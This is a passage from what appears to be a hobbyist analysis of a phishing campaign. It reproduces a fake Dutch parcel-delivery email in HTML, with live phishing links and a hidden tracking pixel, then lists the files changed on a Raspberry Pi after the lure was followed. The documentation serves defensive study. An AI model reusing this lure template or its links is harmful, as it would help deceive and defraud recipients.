    f: opt.asyncCookieSyncWhenSkip,
    s: opt.isNotRootAdHandler,
    g: opt.submitFallbackTimeoutMs,
    b: opt.intentEnabled,
    y: opt.intentSubmitTimeoutMs,
    u: opt.intentUrlScheme,
    w: opt.intentUseDefaultBrowser,
    h: opt.chromeIOSDirectLink,
    v: opt.adexOnlineFiltration,
    o: opt.adexResponseTimeout,
    t: opt.browserSession,
    c: opt.requestVar,
    d: opt.ymid,
    i: opt.clickSubmit,
    x: opt.clickSubmitURL,
    a: opt.lazyPixelSubmit

## 7. Dynamic analysis of the malware

A disk image is created for a Raspberry Pi and stored (situation before). The malware from the mail is executed (by following the "guidelines") and the resulting disk image is stored again (situation after).

The start of the malware execution is the email HTML part

    <!DOCTYPE html>
    <html lang="nl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>dier</title>

    </head>
    <body>

    <div style="text-align: center; max-width: 800px; margin: 0 auto;  padding: 18px; background-color: #ffffff; border-radius: 9px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); padding-left:50px;">
    <div bis_size="{&quot;x&quot;:10,&quot;y&quot;:29,&quot;w&quot;:877,&quot;h&quot;:86,&quot;abs_x&quot;:1017,&quot;abs_y&quot;:290}">
    <p><span style="background: rgb(255, 179, 128);"><span style="font-stretch: normal; font-size: 60px; line-height: normal; font-family: arial;"><b>Pakketbezorging</b></span></span><br />
    <span style="font-family: sans-serif; font-size: 18px; padding: 0px; margin: 0px; line-height: 25.2px;"><span style="font-stretch: normal; font-size: 35px; line-height: normal; font-family: arial;"><b>HALLO roger.pynckels,</b></span></span></p>

    <p><span style="color: rgb(95, 37, 1); font-family: bahnschrift; font-size: 16px; padding: 5px 1px;"><b>Het spijt ons u te moeten mededelen dat er een logistieke fout is opgetreden op onze<br />
    eindigen met betrekking tot het adres van een pakket dat voor u bestemd is.<br />
    Het pakket is aangekomen bij onze lokale verzendfaciliteit.</b></span></p>

    <p><span style="color: rgb(0, 0, 0); font-family: &quot;yu gothic ui&quot;; font-size: 25px;"><b>Adrres/detaills verifi&euml;ren en leverinng bevestiggen:</b></span></p>

    <h2><span style="color: rgb(0, 0, 0); font-family: &quot;yu gothic ui semibold&quot;; font-size: 18px;">Plan uw bezorging en abonneer u op onze push
    meldingen om te voorkomen dat dit opnieuw gebeurt!</span>

    <span style="color: rgb(0, 0, 0); font-family: &quot;yu gothic ui semibold&quot;;">Uw trackingcode:</span></h2>

    <h2><span style="font-size: 18px; text-align: -webkit-center; background-color: rgba(153, 153, 153, 0.6);">US:52100008889</span></h2>

    <img style="display: none" src="http://frthi.trophytakers.com/4a0aeqv2yzcpuog0bsqusxg7wk3ayfwv7lg3lsxhqk7svngsrwxdu33h33o3wvdsdrsjinos5jOUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/f3xnsg0w3ni/ICRNwMNKT9gqe171BRQJh6WpKmDPrqk1BHqzr8Jz0mPY/780564350873669074167519828050420/1xnLjmMeCkxuuqWu87ec98DKMSkD4uWSIIBGMCfjypHc" />

    <a href="https://www.nwwdeest.org/foyfnkfrnosexli" style="text-decoration: none;color:white;">n</a>     
    <p><a href="http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286" style="display: inline-block; padding: 10px 10px; background-color:#ff8000; color: #ffffff; text-decoration: none; border-radius: 15px; font-size: 30px;"> COntroler het afleveraddres</a></p>
    <a href="https://www.emerfggm.org/tycgznqffbyujiq" style="text-decoration: none;color:white;">n</a>

    </div>

    </body>
    </html>

The difference between the before disk contents and the after disk contents are concentrated in the second partition (root file system). Note that a number of differences are due to a reboot between the 'before' and the 'after' situation in order to take a clean 'before' disk duplicate ('dd').

Note that the used attack vectors are probably different for each type of CPU (x86, ARM, ...) and for each type of OS (Linux, Mac, Windows). The 'exercise' below is just an example.

The meaning of the line prefixes are the following:

    'modified': files changed after the reboot and malware execution
    'extra':    files not available before the reboot and malware execution, but     available after the reboot and malware execution
    'missing':  files     available before the reboot and malware execution, but not available after the reboot and malware execution

    modified: etc/X11/xorg.conf.d/99-v3d.conf
    modified: etc/X11/xorg.conf.d
    modified: etc/cups/subscriptions.conf.O
    modified: etc/cups/subscriptions.conf
    modified: etc/cups
    modified: etc/fake-hwclock.data
    modified: etc/resolv.conf
    modified: home/rpi/.Xauthority
    modified: home/rpi/.bash_history
    modified: home/rpi/.cache/chromium/Default/Cache/Cache_Data/index-dir/the-real-index
    modified: home/rpi/.cache/chromium/Default/Cache/Cache_Data/index-dir
    modified: home/rpi/.cache/chromium/Default/Cache/Cache_Data
    modified: home/rpi/.cache/chromium/Default/Code Cache/js/9e8e4d8b8189cbdd_0
    modified: home/rpi/.cache/chromium/Default/Code Cache/js/e45861a5468a5639_0
    modified: home/rpi/.cache/chromium/Default/Code Cache/js/index-dir/the-real-index
    modified: home/rpi/.cache/chromium/Default/Code Cache/js/index-dir
    modified: home/rpi/.cache/chromium/Default/Code Cache/js
    modified: home/rpi/.cache/mesa_shader_cache/index
    modified: home/rpi/.cache/mesa_shader_cache
    modified: home/rpi/.cache
    modified: home/rpi/.config/chromium/CertificateRevocation
    modified: home/rpi/.config/chromium/Crash Reports/settings.dat
    modified: home/rpi/.config/chromium/Default/AutofillStrikeDatabase/LOG
    modified: home/rpi/.config/chromium/Default/AutofillStrikeDatabase
    modified: home/rpi/.config/chromium/Default/BrowsingTopicsState
    modified: home/rpi/.config/chromium/Default/BudgetDatabase/LOG
    modified: home/rpi/.config/chromium/Default/BudgetDatabase
    modified: home/rpi/.config/chromium/Default/ClientCertificates/LOG
    modified: home/rpi/.config/chromium/Default/ClientCertificates
    modified: home/rpi/.config/chromium/Default/Cookies-journal
    modified: home/rpi/.config/chromium/Default/Cookies
    modified: home/rpi/.config/chromium/Default/DIPS-journal
    modified: home/rpi/.config/chromium/Default/DIPS
    modified: home/rpi/.config/chromium/Default/DawnGraphiteCache/data_1
    modified: home/rpi/.config/chromium/Default/DawnGraphiteCache/index
    modified: home/rpi/.config/chromium/Default/DawnWebGPUCache/data_1
    modified: home/rpi/.config/chromium/Default/DawnWebGPUCache/index
    modified: home/rpi/.config/chromium/Default/Download Service/EntryDB/LOG
    modified: home/rpi/.config/chromium/Default/Download Service/EntryDB
    modified: home/rpi/.config/chromium/Default/Extension Scripts/LOG
    modified: home/rpi/.config/chromium/Default/Extension Scripts
    modified: home/rpi/.config/chromium/Default/Extension State/000003.log
    modified: home/rpi/.config/chromium/Default/Extension State/LOG
    modified: home/rpi/.config/chromium/Default/Extension State
    modified: home/rpi/.config/chromium/Default/Extensions
    modified: home/rpi/.config/chromium/Default/Favicons-journal
    modified: home/rpi/.config/chromium/Default/Favicons
    modified: home/rpi/.config/chromium/Default/Feature Engagement Tracker/AvailabilityDB/LOG
    modified: home/rpi/.config/chromium/Default/Feature Engagement Tracker/AvailabilityDB
    modified: home/rpi/.config/chromium/Default/Feature Engagement Tracker/EventDB/LOG
    modified: home/rpi/.config/chromium/Default/Feature Engagement Tracker/EventDB
    modified: home/rpi/.config/chromium/Default/GCM Store/Encryption/000003.log
    modified: home/rpi/.config/chromium/Default/GCM Store/Encryption/LOG
    modified: home/rpi/.config/chromium/Default/GCM Store/Encryption
    modified: home/rpi/.config/chromium/Default/GCM Store
    modified: home/rpi/.config/chromium/Default/GPUCache/data_0
    modified: home/rpi/.config/chromium/Default/GPUCache/data_1
    modified: home/rpi/.config/chromium/Default/GPUCache/data_2
    modified: home/rpi/.config/chromium/Default/GPUCache/index
    modified: home/rpi/.config/chromium/Default/History-journal
    modified: home/rpi/.config/chromium/Default/History
    modified: home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00
    modified: home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.leveldb/000003.log
    modified: home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.leveldb/LOG
    modified: home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.leveldb
    modified: home/rpi/.config/chromium/Default/IndexedDB
    modified: home/rpi/.config/chromium/Default/LOG
    modified: home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/LOG
    modified: home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/MANIFEST-000001
    modified: home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm
    modified: home/rpi/.config/chromium/Default/Local Storage/leveldb/000003.log
    modified: home/rpi/.config/chromium/Default/Local Storage/leveldb/LOG
    modified: home/rpi/.config/chromium/Default/Local Storage/leveldb
    modified: home/rpi/.config/chromium/Default/Managed Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/000003.log
    modified: home/rpi/.config/chromium/Default/Managed Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/LOG
    modified: home/rpi/.config/chromium/Default/Managed Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm
    modified: home/rpi/.config/chromium/Default/Network Action Predictor-journal
    modified: home/rpi/.config/chromium/Default/Network Action Predictor
    modified: home/rpi/.config/chromium/Default/Network Persistent State
    modified: home/rpi/.config/chromium/Default/PersistentOriginTrials/LOG
    modified: home/rpi/.config/chromium/Default/PersistentOriginTrials
    modified: home/rpi/.config/chromium/Default/Preferences
    modified: home/rpi/.config/chromium/Default/Reporting and NEL-journal
    modified: home/rpi/.config/chromium/Default/Reporting and NEL
    modified: home/rpi/.config/chromium/Default/SCT Auditing Pending Reports
    modified: home/rpi/.config/chromium/Default/Segmentation Platform/SegmentInfoDB/LOG
    modified: home/rpi/.config/chromium/Default/Segmentation Platform/SegmentInfoDB
    modified: home/rpi/.config/chromium/Default/Segmentation Platform/SignalDB/LOG
    modified: home/rpi/.config/chromium/Default/Segmentation Platform/SignalDB
    modified: home/rpi/.config/chromium/Default/Segmentation Platform/SignalStorageConfigDB/LOG
    modified: home/rpi/.config/chromium/Default/Segmentation Platform/SignalStorageConfigDB
    modified: home/rpi/.config/chromium/Default/Service Worker/Database/000003.log
    modified: home/rpi/.config/chromium/Default/Service Worker/Database/LOG
    modified: home/rpi/.config/chromium/Default/Service Worker/Database
    modified: home/rpi/.config/chromium/Default/Service Worker/ScriptCache/index-dir/the-real-index
    modified: home/rpi/.config/chromium/Default/Service Worker/ScriptCache/index-dir
    modified: home/rpi/.config/chromium/Default/Service Worker/ScriptCache
    modified: home/rpi/.config/chromium/Default/Session Storage/000003.log
    modified: home/rpi/.config/chromium/Default/Session Storage/LOG
    modified: home/rpi/.config/chromium/Default/Session Storage
    modified: home/rpi/.config/chromium/Default/Sessions
    modified: home/rpi/.config/chromium/Default/Site Characteristics Database/000003.log
    modified: home/rpi/.config/chromium/Default/Site Characteristics Database/LOG
    modified: home/rpi/.config/chromium/Default/Site Characteristics Database
    modified: home/rpi/.config/chromium/Default/Sync Data/LevelDB/LOG
    modified: home/rpi/.config/chromium/Default/Sync Data/LevelDB
    modified: home/rpi/.config/chromium/Default/TransportSecurity
    modified: home/rpi/.config/chromium/Default/Trust Tokens-journal
    modified: home/rpi/.config/chromium/Default/Trust Tokens
    modified: home/rpi/.config/chromium/Default/Visited Links
    modified: home/rpi/.config/chromium/Default/Web Data-journal
    modified: home/rpi/.config/chromium/Default/Web Data
    modified: home/rpi/.config/chromium/Default/WebStorage/QuotaManager-journal
    modified: home/rpi/.config/chromium/Default/WebStorage/QuotaManager
    modified: home/rpi/.config/chromium/Default/blob_storage
    modified: home/rpi/.config/chromium/Default/commerce_subscription_db/LOG
    modified: home/rpi/.config/chromium/Default/commerce_subscription_db
    modified: home/rpi/.config/chromium/Default/discounts_db/LOG
    modified: home/rpi/.config/chromium/Default/discounts_db
    modified: home/rpi/.config/chromium/Default/optimization_guide_hint_cache_store/LOG
    modified: home/rpi/.config/chromium/Default/optimization_guide_hint_cache_store
    modified: home/rpi/.config/chromium/Default/parcel_tracking_db/LOG
    modified: home/rpi/.config/chromium/Default/parcel_tracking_db
    modified: home/rpi/.config/chromium/Default/shared_proto_db/000003.log
    modified: home/rpi/.config/chromium/Default/shared_proto_db/LOG
    modified: home/rpi/.config/chromium/Default/shared_proto_db/metadata/000003.log
    modified: home/rpi/.config/chromium/Default/shared_proto_db/metadata/LOG
    modified: home/rpi/.config/chromium/Default/shared_proto_db/metadata
    modified: home/rpi/.config/chromium/Default/shared_proto_db
    modified: home/rpi/.config/chromium/Default/trusted_vault.pb
    modified: home/rpi/.config/chromium/Default
    modified: home/rpi/.config/chromium/FileTypePolicies
    modified: home/rpi/.config/chromium/GrShaderCache/data_0
    modified: home/rpi/.config/chromium/GrShaderCache/data_1
    modified: home/rpi/.config/chromium/GrShaderCache/data_3
    modified: home/rpi/.config/chromium/GrShaderCache/index
    modified: home/rpi/.config/chromium/GraphiteDawnCache/data_1
    modified: home/rpi/.config/chromium/GraphiteDawnCache/index
    modified: home/rpi/.config/chromium/Last Version
    modified: home/rpi/.config/chromium/Local State
    modified: home/rpi/.config/chromium/MEIPreload
    modified: home/rpi/.config/chromium/OnDeviceHeadSuggestModel
    modified: home/rpi/.config/chromium/OptimizationHints
    modified: home/rpi/.config/chromium/OriginTrials
    modified: home/rpi/.config/chromium/PrivacySandboxAttestationsPreloaded
    modified: home/rpi/.config/chromium/SSLErrorAssistant
    modified: home/rpi/.config/chromium/SafetyTips
    modified: home/rpi/.config/chromium/ShaderCache/data_1
    modified: home/rpi/.config/chromium/ShaderCache/index
    modified: home/rpi/.config/chromium/Subresource Filter/Unindexed Rules
    modified: home/rpi/.config/chromium/Subresource Filter
    modified: home/rpi/.config/chromium/TrustTokenKeyCommitments
    modified: home/rpi/.config/chromium/Variations
    modified: home/rpi/.config/chromium/ZxcvbnData
    modified: home/rpi/.config/chromium/hyphen-data
    modified: home/rpi/.config/chromium/segmentation_platform/ukm_db-journal
    modified: home/rpi/.config/chromium/segmentation_platform/ukm_db
    modified: home/rpi/.config/chromium
    modified: home/rpi/.local/state/wireplumber/restore-stream
    modified: home/rpi/.local/state/wireplumber
    modified: home/rpi/.xsession-errors.old
    modified: home/rpi/.xsession-errors
    modified: home/rpi/Documents/__virus__
    modified: home/rpi
    modified: tmp/.ICE-unix
    modified: tmp/.X11-unix
    modified: tmp/.XIM-unix
    modified: tmp/.font-unix
    modified: var/cache/apt
    modified: var/cache/cups/job.cache.O
    modified: var/cache/cups/job.cache
    modified: var/cache/cups/org.cups.cupsd
    modified: var/cache/cups
    modified: var/lib/NetworkManager/NetworkManager.state
    modified: var/lib/NetworkManager/internal-092d94ec-495c-4ff1-9035-92303b7015e1-wlan0.lease
    modified: var/lib/NetworkManager/seen-bssids
    modified: var/lib/NetworkManager/timestamps
    modified: var/lib/NetworkManager
    modified: var/lib/PackageKit/transactions.db
    modified: var/lib/PackageKit
    modified: var/lib/alsa/asound.state
    modified: var/lib/alsa
    modified: var/lib/apt/lists/partial
    modified: var/lib/plymouth/boot-duration
    modified: var/lib/systemd/random-seed
    modified: var/lib/systemd/rfkill/platform-soc:bluetooth
    modified: var/lib/systemd/rfkill
    modified: var/lib/systemd/timesync/clock
    modified: var/log/boot.log
    modified: var/log/cups/access_log
    modified: var/log/journal/009e558b493d432fa06e64ca303284b4/system.journal
    modified: var/log/journal/009e558b493d432fa06e64ca303284b4/user-1000.journal
    modified: var/log/journal/009e558b493d432fa06e64ca303284b4
    modified: var/log/lastlog
    modified: var/log/lightdm/lightdm.log.old
    modified: var/log/lightdm/lightdm.log
    modified: var/log/lightdm
    modified: var/log/wtmp
    modified: var/tmp

    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/0098fda80c61b051_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/02c7a83d9c26d1c2_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/080eda7bc761e158_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/0987b405cc1bcd83_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/104cc79564dfb4e6_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/170c2e72187ecfec_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/1a57b014e3b39bf3_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/1cefb5a34b573d08_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/1d1302f8e9661e1a_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/1f704d9b8b16ce8c_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/22bc00fac7e97249_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/250d2333090adad7_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/2aba3522e3735706_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/30d70475a51b1f50_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/31d4300bcb73f77e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/31dce78f494b18ec_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/3672ba730c6cedb1_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/36a43833ae6c752e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/3ef7589a5b63d72d_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/41c42834f8a2b32b_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/4394a00e645afd49_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/44785169c8407bd8_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/44da0119870a15cf_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/4634fe82f7e55c5e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/4d21e418d893ac5d_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/513db77f1bb889f0_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/57332ae679b1d208_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/5e7427b7b7385faf_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/63d2a073a5614819_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/64642c327a992cb7_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/6695593f2b427bf8_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/6ba95fdde8c14a77_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/6c5db7362d40c1f4_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/6ec3033511f52862_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/6ef9755294975de9_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/701d91d35f03ee65_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/72a8256166e27a63_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/7768de336a34ff20_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/7a0c8a7a7645d740_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/7a5adfb236595858_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/7ce1e554faf12112_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/7f24ee02222730ab_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/7f93b47b73b7a154_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/823947feaf95a37f_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/86c09d2f277f31a9_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/87377f4640bb40d3_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/8bc68607aa159c0e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/92bf4c78359a35f6_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/939af3b79ed8e16b_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/95d831a37ed296e2_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/978175d32a4f66d7_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/9d941366cc77af61_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/9ecfe5e61b67eda2_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/9ee9bc051075234c_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/9fedd2c7c1400c40_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/a41f5c5b484ddf8b_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/a729293f4bbbfab8_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/a76022e772a9791e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/a7c98736649689e4_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/af4483578ccc838b_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/b0252fb07bb2dd90_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/b039269cdd70ac19_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/b33e3127082efccb_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/b78418467a24a93e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/b7899f99649c3723_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/b8ed10afa748dfff_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/c22b8c962114e00e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/c43be3c352453e38_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/c448499e3fc84431_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/c8d2dabe470247e6_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/c9b0ab6282e2ab91_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/ca4e3d4fd24128be_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/cc0fb5bfd3eaa3fb_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/cd65b1297b89ee06_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/ce15ec4e31d31d52_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/d0e277ac5b54236f_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/d2a8841f8b5b3454_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/dccbc146a1ea796e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/e1197908e81ec6a2_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/e3f9d9fcb61393df_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/ebdc92c1daef0f6a_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/ee8672ac2590cf73_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/efbe7aba4f6071d7_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/f00a8d134b6c25cf_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/f2109eeda0947646_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/f3bca9fb8e6b7f78_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/f674c341cff5783e_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/f9fd7b114ca45a53_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/fc90a7d8ed00aeac_0
    extra:    home/rpi/.cache/chromium/Default/Cache/Cache_Data/fdc83c6cd6f31174_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/0976ddfc1998392d_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/0ab5ba6e3475f9e7_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/1a4acb259098a2ac_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/207e7dd5db61e8ae_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/21165dc2236dd1bd_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/2258bbb222275b1a_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/2eedfab333d35be1_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/64d68a5d7212bc43_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/7f74c5134c4f0376_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/83a13e591ecf819b_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/849635bfe833383f_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/853fd5573a2feae0_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/9adee79ccfa1d8c0_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/9e55b86223f4910d_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/a58208568f86645b_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/b908af42ed1c2de0_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/ba9a78b159c63df0_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/bbd997c6ddb3c990_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/c0e0a9886ad44282_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/ceab754fd320fea1_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/da45ddea9233f40f_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/de689765c0eef3ca_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/e999d2da86e044dc_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/f92eb72797279a6d_0
    extra:    home/rpi/.cache/chromium/Default/Code Cache/js/fff8ef8cff75038d_0
    extra:    home/rpi/.cache/menus
    extra:    home/rpi/.cache/mesa_shader_cache/04
    extra:    home/rpi/.cache/mesa_shader_cache/14
    extra:    home/rpi/.cache/mesa_shader_cache/1a
    extra:    home/rpi/.cache/mesa_shader_cache/1f
    extra:    home/rpi/.cache/mesa_shader_cache/2e
    extra:    home/rpi/.cache/mesa_shader_cache/30
    extra:    home/rpi/.cache/mesa_shader_cache/67
    extra:    home/rpi/.cache/mesa_shader_cache/7b
    extra:    home/rpi/.cache/mesa_shader_cache/9d
    extra:    home/rpi/.cache/mesa_shader_cache/d4
    extra:    home/rpi/.cache/mesa_shader_cache/fc
    extra:    home/rpi/.config/chromium/BrowserMetrics-spare.pma
    extra:    home/rpi/.config/chromium/CertificateRevocation/9261
    extra:    home/rpi/.config/chromium/Default/AutofillStrikeDatabase/LOG.old
    extra:    home/rpi/.config/chromium/Default/BudgetDatabase/LOG.old
    extra:    home/rpi/.config/chromium/Default/ClientCertificates/LOG.old
    extra:    home/rpi/.config/chromium/Default/Download Service/EntryDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/Extension Scripts/LOG.old
    extra:    home/rpi/.config/chromium/Default/Extension State/LOG.old
    extra:    home/rpi/.config/chromium/Default/Feature Engagement Tracker/AvailabilityDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/Feature Engagement Tracker/EventDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/GCM Store/000003.log
    extra:    home/rpi/.config/chromium/Default/GCM Store/CURRENT
    extra:    home/rpi/.config/chromium/Default/GCM Store/Encryption/LOG.old
    extra:    home/rpi/.config/chromium/Default/GCM Store/LOCK
    extra:    home/rpi/.config/chromium/Default/GCM Store/LOG
    extra:    home/rpi/.config/chromium/Default/GCM Store/LOG.old
    extra:    home/rpi/.config/chromium/Default/GCM Store/MANIFEST-000001
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/10
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/11
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/12
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/13
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/4
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/5
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/c
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/d
